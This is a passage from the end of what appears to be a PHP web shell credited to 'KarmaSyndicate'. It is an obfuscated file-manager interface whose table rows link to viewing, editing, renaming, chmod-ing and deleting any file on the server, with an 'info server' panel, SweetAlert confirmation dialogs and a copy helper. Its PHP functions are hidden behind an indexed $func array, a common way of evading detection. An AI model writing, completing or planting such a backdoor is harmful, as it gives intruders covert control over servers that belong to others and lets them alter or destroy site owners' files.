                    <a data-bs-toggle="collapse" href="#newFileCollapse" role="button" aria-expanded="false" aria-controls="newFileCollapse" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-plus"></i></a>
                    <a data-bs-toggle="collapse" href="#newInfoServer" role="button" aria-expanded="false" aria-controls="newInfoServer" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-info"></i></a>
                  </div>
                  <?php endif; ?>
                </td>
              </tr>
              <?php endforeach; ?>
              <?php
                foreach ($dirs as $dir) :
                  if (!is_file($dir)) continue;
              ?>
              <tr>
                <td>
                  <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=view" class="text-decoration-none text-light"><i class="fa fa-file-code"></i> <?= $dir ?></a>
                </td>
                <td class="text-light"><?= ($func[25]('mime_content_type') ? $func[24]($dir) : $func[8]($dir)) ?></td>
                <td class="text-light"><?= $func[26]($dir) ?></td>
                <td class="text-light"><?= $func[35]($dir) ?></td>
                <td class="text-light"><?= $func[11]($func[10]('%o', $func[6]($dir)), -4); ?></td>
                <td class="text-light"><?= $func[23]("Y-m-d h:i:s", $func[7]($dir)); ?></td>
                <td>
                  <?php if ($dir != '.' && $dir != '..') : ?>
                  <div class="btn-group">
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=edit" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-edit"></i></a>
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=rename" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-edit"></i></a>
                    <a href="?dir=<?= $path ?>&item=<?= $dir ?>&action=chmod" class="btn btn-outline-light btn-sm mr-1"><i class="fa fa-file-signature"></i></a>
                    <a href="" class="btn btn-outline-light btn-sm mr-1" onclick="return deleteConfirm('?dir=<?= $path ?>&item=<?= $dir ?>&action=delete')"><i class="fa fa-trash"></i></a>
                  </div>
                  <?php endif; ?>
                </td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </div>
        <div class="text-light">&#169; KarmaSyndicate <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script></div>
      </div>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.0/dist/sweetalert2.all.min.js"></script>
  <script>
  <?php if (isset($_SESSION['message'])) : ?>
        Swal.fire(
          '<?= $_SESSION['status'] ?>',
          '<?= $_SESSION['message'] ?>',
          '<?= $_SESSION['class'] ?>'
        )
  <?php endif; clear(); ?>
    function deleteConfirm(url) {
      event.preventDefault()
      Swal.fire({
          title: 'Are you sure?',
          icon: 'warning',
          showCancelButton: true,
          confirmButtonColor: '#3085d6',
          cancelButtonColor: '#d33',
          confirmButtonText: 'Yes, delete it!'
      }).then((result) => {
          if (result.isConfirmed) {
            window.location.href = url
        }
      })
    }
    function jscopy() {
      var jsCopy = document.getElementById("CopyFromTextArea");
      jsCopy.focus();
      jsCopy.select();
      document.execCommand("copy");
    }
  </script>
</body>
</html>